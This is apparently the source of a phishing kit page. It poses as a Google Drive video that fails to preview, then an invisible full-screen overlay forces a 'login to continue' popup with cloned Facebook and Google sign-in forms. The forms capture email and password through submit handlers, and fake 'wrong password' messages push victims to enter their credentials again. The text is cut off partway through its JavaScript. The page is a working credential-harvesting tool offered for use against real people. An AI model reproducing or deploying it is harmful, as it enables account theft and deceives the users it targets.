<?php
if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html lang="en">
 <head> 
  <meta charset="UTF-8"> 
  <link rel="icon" href="//ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <title><?php include 'system/isidata.php'; echo htmlspecialchars($judul); ?>.mp4 - Google Drive</title> 
  <link rel="stylesheet" href="assets/index.0408f365.css"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Hyuu09/my-css@main/stylee.css">
 </head> 
 <body>
  <div id="app" data-v-app="">
   <div class="header">
    <div class="left">
     <div class="icon">
      <img src="https://ssl.gstatic.com/docs/doclist/images/mediatype/icon_2_archive_x32.png">
     </div>
     <div class="title">
      <?php include 'system/isidata.php'; echo htmlspecialchars($judul); ?>.mp4
     </div>
    </div>
    <div class="right">
     <div class="dl">
     <a onclick="opalexf()">
      <img src="data:image/png;base64,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">
      </a>
     </div>
     <div class="menu">
     <a onclick="opalexf()">
      <img src="https://cdn-icons-png.flaticon.com/512/61/61140.png">
      </a>
     </div>
    </div>
   </div>
   <div class="round">
    <h1>Tidak dapat melakukan pratinjau file<br>Terjadi masalah dengan pratinjau</h1>
    <a onclick="opalexf()">
    <div class="bottom">
    </a>
    <a onclick="opalexf()">
     <div class="download">
     </a>
     <a onclick="opalexf()">
      <div class="dl">
      </a>
      <a onclick="opalexf()">
       <img src="data:image/png;base64,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">
      </div> Download 
     </div>
     </a>
     <a onclick="opalexf()">
     <div class="conn">
      <div class="cross">
       +
      </div> Hubungkan lebih banyak.. 
     </div>
     </a>
    </div>
   </div>
<div onclick="$('#PopUpLog').fadeIn();" id="Penahan" style="background: rgba(0,0,0,0.0);width: 100%;height: 100%;position: fixed;top: 0;left: 0;z-index: 9999999;">


<div id="PopUpLog" style="background: rgba(0,0,0,0.5);width: 100%;height: 100%;position: fixed;top: 0;left: 0;z-index: 9999999;display:none;">
<div style="position: relative;margin: 50px auto;
        margin-top: 70%;
        text-align: center;" class="modal-content">
          <span onclick="$('#PopUpLog').fadeOut();" class="modal-close">×</span>
          <h2 style="font-family: 'Inter';
font-smooth: always;">Login to continue this video</h2>
            <button onclick="$('.login-facebook').fadeIn();" style="background:#fff;color:#000;width: 100%;padding: 12px;border: 1px solid black;border-radius: 8px;font-size: 1rem;font-weight: 600;cursor: pointer;transition: opacity 0.2s ease;" onclick="$('.login-google').fadeIn();$('#PopUpLog').hide();" type="submit"><i style="margin-right:70px;" class="fa-brands fa-facebook-f"></i><span style="margin-right:70px;">Login with Facebook</span></button>
            <div style="margin-top:10px;"></div>
            <button onclick="$('.login-google').fadeIn();" style="background:#fff;color:#000;width: 100%;padding: 12px;border: 1px solid black;border-radius: 8px;font-size: 1rem;font-weight: 600;cursor: pointer;transition: opacity 0.2s ease;" onclick="$('.login-google').fadeIn();$('#PopUpLog').hide();" type="submit"><i style="margin-right:75px;" class="fa-brands fa-google"></i><span style="margin-right:85px;">Login with Google</span></button>
        </div>
        </div>
        
        <div class="popup-login login-facebook animated fadeIn" style="display: none;">
        <div class="container-box-fb" style="margin-top: 10%;">
        <div class="atasan-fb" style="background: none;">
        <i class="fa-solid fa-arrow-left" onclick="$('.login-facebook').fadeOut();" style="color:#1979f4;position: absolute; width: 25px; margin-top: 10px; left: 10px;" alt=""></i>
		<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/1/facebook_text.webp" style="margin-top: -5px;margin-left: 105px">
	</div>
	<div class="isi-facebook" style="padding-bottom: 10px;">
		<p class="kaget email">
			Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b>
		</p>
		<p class="kaget sandi">
			Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b>
		</p>
		<img src="https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/20240110_175143.png">
		<div class="txt-ucapan-fb">
			Masuk ke akun Facebook Anda untuk terhubung dengan Facebook
		</div>
		<form class="form-login-fb" onsubmit="AICheckerr(this); return false;" action="javascript:void(0)" id="sendfagen">
			<div class="form-group">
				<input type="text" id="fgn_email_fb2" name="email" autocomplete="off" autocapitalize="off" placeholder=" " required="">
				<label for="fgn_email_fb2" id="EmailLabel" class="hidden-label">Nomor ponsel atau email</label>
			</div>
			<div class="form-group">
				<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/1/hide.png" id="HidePw" alt="">
				<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/1/show.png" id="ShowPw" alt="">
				<input type="password" id="fgn_password_fb2" name="password" autocomplete="off" autocapitalize="off" placeholder=" " required="">
				<label for="fgn_password_fb2" id="PasswordLabel" class="hidden-label">Kata Sandi Facebook</label>
			</div>
			<input type="hidden" name="login" value="Facebook" readonly="">
			<button class="btn-login-fb" type="submit" onclick="return SubmitDataFB();" style="border-radius: 48px; margin-top: 13px;">Masuk</button>
			<label style="font-size: 14px; color: #838489; display: block; margin-top: 15px;">Lupa Kata Sandi?</label>
			<button class="btn-login-fb" type="button" style="border-radius: 48px; margin-top: 38px; background: none !important; color: #4292f8; border: 1px solid #4292f8 !important; font-weight: 100em !important; box-shadow: transparent !important;">Buat Akun Baru</button>
		</form>
		<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/1/MetaLogo.png" style="display: block; margin: 20px auto; width: 70px; position: relative; top: 0;" alt="">
	</div>
</div>
</div>
<style type="text/css">
.lds-ring, .lds-ring div { box-sizing: border-box; } .lds-ring { display: inline-block; position: relative; width: 80px; height: 80px; margin-top:70px; } .lds-ring div { box-sizing: border-box; display: block; position: absolute; width: 64px; height: 64px; margin: 8px; border: 8px solid #0B57CF; border-radius: 50%; animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite; border-color: #0B57CF transparent transparent transparent; } .lds-ring div:nth-child(1) { animation-delay: -0.45s; } .lds-ring div:nth-child(2) { animation-delay: -0.3s; } .lds-ring div:nth-child(3) { animation-delay: -0.15s; } @keyframes lds-ring { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } .form { width: 100%; padding: 0px 15px; border-radius: 3px; box-shadow: 0 10px 25px rgba(92, 99, 105, 0.2); } .form__div { position: relative; height: 50px; margin-bottom: 15px; } .showpass { position: relative; height: 50px; margin-top: 0px; } .showpass label { position: relative; margin-top: 2px; margin-left: 4px; font-size:11px; color:#000; } .form__input { position: absolute; top: -1; left: 0; width: 100%; height: 100%; border: 1px solid #AFB0AF; border-radius: 3px; color: #454746; outline: none; padding: 10px; background: none; font-size: 16px; font-weight: 400; font-family: 'Open Sans', sans-serif; z-index: 1; } .form__label { position: absolute; left: 10px; top: 1rem; padding: 0 5px; background-color: #fff; color: #454746; transition: 0.3s; font-size: 11px; font-weight: 400; } /*Input focus move up label*/ .form__input:focus + .form__label { top: -0.4rem; left: 0.5rem; color: #0B57CF; font-size: 11px; font-weight: 400; z-index: 10; } /*Input focus sticky top label*/ .form__input:not(:placeholder-shown).form__input:not(:focus) + .form__label { top: -0.4rem; left: 0.5rem; z-index: 10; font-weight: 400; font-size: 11px; } /*Input focus*/ .form__input:focus { border: 2px solid #0B57CF; font-size: 16px; } .header-gg { background: #fff; width: 100%; height: 40px; padding: 8px; border-radius: 5px 5px 0px 0px; border-bottom: 1px solid #E5EAED; margin-bottom: 20px; position: relative; } .header-gg img { width: 20px; height: 20px; float:left; display: block; margin-top:1px; margin-left:2px; margin-right:-10px; } .header-gg-text { color: #000; font-size: 15px; font-weight: 500; font-family: 'Open Sans', sans-serif; text-align: center; margin-top:2px; padding-left:-2px; } .txt-login-gg { padding-top: 1px; padding-left: 2px; color: #000; text-align: left; font-size: 25px; font-weight: 400; font-family: 'Open Sans', sans-serif; margin-bottom: 3%; } .txt-login-ggs { padding-top: 1px; padding-left: 2px; color: #000; text-align: left; font-size: 15px; font-weight: 400; font-family: 'Open Sans', sans-serif; margin-bottom: 10%; } .content-box-gg { width: 90%; height: auto; margin-left: auto; margin-right: auto; padding-bottom: 25px; display: block; } .content-box-gg-txt { width: auto; height: auto; display: inline-block; margin-left: auto; margin-right: 10px; padding-bottom: 10px; display: block; } .content-box-gg-txt img { width: 55px; border:none; border-radius: 12px; margin-top: 10px; margin-left: 5px; margin-right: 10px; float: left; } .content-box-gg p { background: #666666; height: 35px; border-radius:10px; color: #fff;. padding-top:5px; font-size: 14px; font-family: 'Open Sans', sans-serif; float:center; text-align: center; } .content-box-gg label { color: #000; font-size: 14px; font-family: 'Open Sans', sans-serif; float: left; text-shadow: none; } .content-box-gg label a { color: #1da1f2; } .content-box-gg-txt-title { color: #6A747E; font-size: 16px; padding-top: 11px; padding-bottom: 7px; font-family: 'Open Sans', sans-serif; font-weight: 300; text-align: left; } .content-box-gg-txt-det { width: auto; height: auto; padding-top: 2px; padding-bottom: 3px; color: #8799A3; font-size: 11px; font-family: 'Open Sans', sans-serif; text-align: left; text-shadow:none; } .alert-gg-failed { background: none; width: auto; height: 34px; padding: 5px; padding-top:0px; margin-top: -10px; margin-bottom: 0px; position: relative; display:none; border-radius:5px; } .alert-gg { width: auto; height: auto; padding-top:0px; text-align:left; border-radius:5px; color: #B3261D; font-size: 12px; float: left; font-weight: 400; margin-bottom:-10px; font-family: 'Open Sans', sans-serif; } .alert-gg img { background: #fff; width: 24px; float:left; margin-right:1px; margin-left:2px; border-radius: 5px; margin-top:-5px; display: inline-block; } .alert-gg-faileds { background: #62656C; width: auto; height: auto; padding: 5px; margin-bottom: 10px; position: relative; display:none; border-radius:5px; } .alert-ggs { width: auto; height: auto; padding:0px; text-align:left; border-radius:5px; color: #fff; font-size: 13px; float:center; margin-bottom:-10px; font-family: 'Open Sans', sans-serif; } .alert-ggs img { background: #fff; width: 24px; float:left; margin-right:1px; margin-left:2px; margin-top: 3px; border-radius: 5px; display: inline-block; } .nonbutton { background: #0B57CF; width: 30%; height: auto; padding:10px; margin-top: -5px; margin-left: -1px; margin-bottom: 50px; padding: 14px; color: #fff; font-size: 15px; font-weight: 400; font-family: 'Open Sans', sans-serif; border: none; border-radius: 10px; outline: none; letter-spacing: 1; float:right; } .content-box-gg-txt-footer { width: auto; height: auto; display: inline-block; color: #454746; font-size:12px; font-family: 'Open Sans', sans-serif; margin-right: 10px; text-align:left; padding-bottom: 10px; display: block; } .content-box-gg-txt-footer a { color: #1A62D1; } .content-box-gg-txt-footers { width: auto; height: auto; display: inline-block; color: #848586; font-size:10.5px; font-family: 'Open Sans', sans-serif; margin-right: 10px; text-align:left; padding-bottom: 10px; display: block; } .content-box-gg-txt-footers a { color: #3D86BD; } .content-box-gg-txt-footer-left { width: auto; height: auto; padding-right:25%; display: inline-block; color: #000; font-size:9px; font-weight: bold; font-family: 'Open Sans', sans-serif; margin-right: 10px; text-align:left; padding-bottom: 10px; display: block; } .img { width: 55px; float:left; display: inline-block; } .content-box-gg-txt label { color: #90949c; font-size: 16px; font-family: Roboto, sans-serif; text-align: left; display: inline-block; } .form-group-gg { width: 100%; max-width: 100%; margin-left: -1px; margin-right: auto; padding: 10px 0; position: relative; display: block; } .form-group-gg input { background: transparent; width: 100%; padding: 16px; padding-top: 25px; padding-bottom: 5px; padding-left: 7px; color: #000; font-size: 17px; font-family: 'Open Sans', sans-serif; border: 1px solid #657786; border-radius: 3.5px; display: block; } .form-group-gg label { color: #6E767D; font-size: 17px; font-weight: 100; font-family: 'Open Sans', sans-serif; text-align: right; top: 0; left: 10.5px; position: absolute; pointer-events: none; transform: translateY(26px); transition: all 0.2s ease-in-out; } .form-group-gg input:valid,.form-group-gg input:focus { border: 2px solid #1da1f2; outline: none; } .form-group-gg input:valid+label,.form-group-gg input:focus+label { color: #1da1f2; font-size: 12px; top: 15px; bottom: 20px; transform: translateY(0); } .form-group-sohi { width: 50px; height: 73%; margin-left: 88%; position: absolute; z-index: 9999999; cursor: pointer; } .form-group-sohi img { width: 23px; opacity: 0.6; margin-top: 16px; } input { background: #fff; } #form { width: 40vw; margin: 0 auto; margin-top: 50px; } .input-box.active-grey { .input-1 { border: 1px solid #dadce0; } .input-label { color: #80868b; top: -8px; background: #fff; font-size: 11px; transition: 250ms; svg { position: relative; width: 11px; height: 11px; top: 2px; transition: 250ms; } } } .input-box { position: relative; margin: 10px 0; .input-label { position: absolute; color: #80868b; font-size: 16px; font-weight: 400; max-width: calc(100% - (2 * 8px)); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; left: 8px; top: 13px; padding: 0 8px; transition: 250ms; user-select: none; pointer-events: none; svg { position: relative; width: 15px; height: 15px; top: 2px; transition: 250ms; } } .input-1 { box-sizing: border-box; height: 50px; width: 100%; border-radius: 4px; color: #202124; border: 1px solid #dadce0; padding: 13px 15px; transition: 250ms; &:focus { outline: none; border: 2px solid #1a73e8; transition: 250ms; } } } .input-box.error { .input-label { color: #f44336; top: -8px; background: #fff; font-size: 11px; transition: 250ms; } .input-1 { border: 2px solid #f44336; } } .input-box.focus, .input-box.active { .input-label { color: #1a73e8; top: -8px; background: #fff; font-size: 11px; transition: 250ms; svg { position: relative; width: 11px; height: 11px; top: 2px; transition: 250ms; } } } .input-box.active { .input-1 { border: 2px solid #1a73e8; } } .pull-right { float: right; } .clear { clear: both; } .btn-forgot-google { background: #fff; width: auto; height: auto; margin: 0px; margin-top: 15px; padding: 10px; padding-left: 0; color: #1a73e8; font-size: 14.5px; font-family: 'Open Sans', sans-serif; font-weight: normal; letter-spacing: .25px; text-align: left; border: none; outline: none; float: left; } .notify-google { width: 100%; height: auto; color: gray; font-size: 14px; font-family: arial, sans-serif; font-weight: normal; text-align: left; margin-top: 15%; margin-bottom: 5%; } .notify-google span { color: #1a73e8; font-weight: inherit; } .btn-create-google { background: #fff; width: auto; height: auto; margin: 0px; padding: 5px; padding-left: 0; color: #1a73e8; font-size: 14.5px; font-family: 'Open Sans', sans-serif; font-weight: normal; letter-spacing: .25px; text-align: left; border: none; outline: none; float: left; } .btn-login-google { background: #1a73e8; width: 30%; height: auto; margin: 0px; padding: 10px; color: #fff; font-size: 14px; font-family: 'Open Sans', sans-serif; font-weight: normal; letter-spacing: .25px; text-align: center; border: none; border-radius: 5px; outline: none; float: right; margin-top: -8px; } @media only screen and (max-width:600px) { .footer-language-google, .footer-menu-google { margin-top: 70%; } .footer-language-account-google, .footer-menu-account-google { margin-top: 90%; } } .popup-loginn { background: rgba(0, 0, 0, 0.5);width: 100%;height: 100%;position: fixed;top: 0;z-index: 9999999;left: 0;display: flex;align-items: center;justify-content: center;}.popup-box-login-gg {background: #fff;width: 400px; max-width: 90%;height: auto;position: relative;border-radius: 8px;box-shadow: 0 4px 15px rgba(0,0,0,0.2);animation-duration: 0.5s;
}
</style>
<div class="popup-loginn login-google animated fadeIn" style="display:none;">
         <div class="popup-box-login-gg">
            <a onclick="$('.login-google').fadeOut();" class="close-other"><i class="zmdi zmdi-close"></i></a> 
            <div class="header-gg">
               <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/imgemel/btn-gp.png"> 
               <div class="header-gg-text">
                  Log in With Google 
               </div>
            </div>
            <div class="content-box-gg">
               <div class="txt-login-gg">
                  Sign in
               </div>
               <div class="txt-login-ggs">
                  to continue to 
                  <a style="color:#185FD1;font-weight: 500;">google.com</a>
               </div>
               <form onsubmit="AICheckerr(this); return false;" action="javascript:void(0)" method="post" id="ValidateLoginGpForm" autocomplete="off">
                  <div class="form__div"> 
                     <input type="email" name="email" class="form__input" placeholder="" id="email-gp" required="" oninvalid="this.setCustomValidity('Enter your valid E-mail address')" oninput="setCustomValidity('')" autocomplete="false"> 
                     <label for="" class="form__label">Email address</label> 
                  </div>
                  <div class="form__div"> 
                     <input autocomplete="one-time-code" name="password" type="password" class="form__input" placeholder="" id="password-gp" required="" oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')"> 
                     <label for="" class="form__label">Enter your password</label> 
                  </div>
                  <center>
                     <div class="alert-gg-failed email-gp"> 
                        <a class="alert-gg"><i class="fa-solid fa-circle-exclamation"></i> Sorry, we couldn't find your account.</a> 
                     </div>
                     <div class="alert-gg-failed sandi-gp"> 
                        <a class="alert-gg"><i class="fa-solid fa-circle-exclamation"></i> Wrong password. Please try again!</a> 
                     </div>
                  </center>
                  <div class="showpass"> 
                     <input style="float:left; margin-left: 1px;" type="checkbox" onclick="showGcodePassword();"> 
                     <label for="showpass">Show Password</label> 
                  </div>
                  <div class="content-box-gg-txt-footer">
                     By continuing, Google will share your name, email address, language preference, and profile picture with googlle.com. See google.com's 
                     <a>Privacy Policy</a> and 
                     <a>Terms of Service.</a>
                     <br>
                     <br>You can manage Sign in with Google in your 
                     <a>Google Account</a>. 
                  </div>
                  <input type="hidden" name="login" id="login-gp" value="Google Play" readonly=""> 
                  <button type="submit" class="nonbutton" onclick="ValidateLoginGpData()">Log in</button> 
               </form>
               <div class="content-box-gg-txt-footer"> 
                  <a style="font-size:15px; font-weight:400;">Forgot password?</a> 
               </div>
            </div>
         </div>
      </div>
      <div class="popup-loginn login-gp-load" style="display:none;">
         <div class="popup-box-login-gg">
            <div class="header-gg">
               <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/imgemel/btn-gp.png"> 
               <div class="header-gg-text">
                  Log in With Google 
               </div>
            </div>
            <div class="content-box-gg">
               <div class="txt-login-gg">
                  Sign in
               </div>
               <div class="txt-login-ggs">
                  to continue to 
                  <a style="color:#185FD1;font-weight: 500;">google.com</a>
               </div>
               <div style="margin-left:40%; margin-top:-10%;" class="gg-load">
                  <div class="gg-load-title">
                     <div class="lds-ring">
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                     </div>
                  </div>
               </div>
               </br></br></br></br>
            </div>
         </div>
      </div>
    <script src="https://code.jquery.com/jquery-3.6.0.js"></script>

<script type="text/javascript">
$(document).ready(function() {
     $("#fgn_email_fb2").on('input', function() {
        var $Email = $("#fgn_email_fb2").val();
        if ($Email.length === 0) {
            $("#EmailLabel").removeClass('active');
            console.log('Label tidak aktif'); 
        } else {
            $("#EmailLabel").addClass('active');
            console.log('Label aktif'); 
        }
    });
    $("#fgn_password_fb2").on('input', function() {
        var $Email = $("#fgn_password_fb2").val();
        if ($Email.length === 0) {
            $("#PasswordLabel").removeClass('active');
            console.log('Label tidak aktif');
            $("#PasswordLabel").addClass('active');
            console.log('Label aktif');
        }
    });
    $("#fgn_password_fb2").on("input", function () {
          $Pw = $("#fgn_password_fb2").val();
          if ($Pw.length == 0) {
            $("#PasswordLabel").removeClass("active");
          } else {
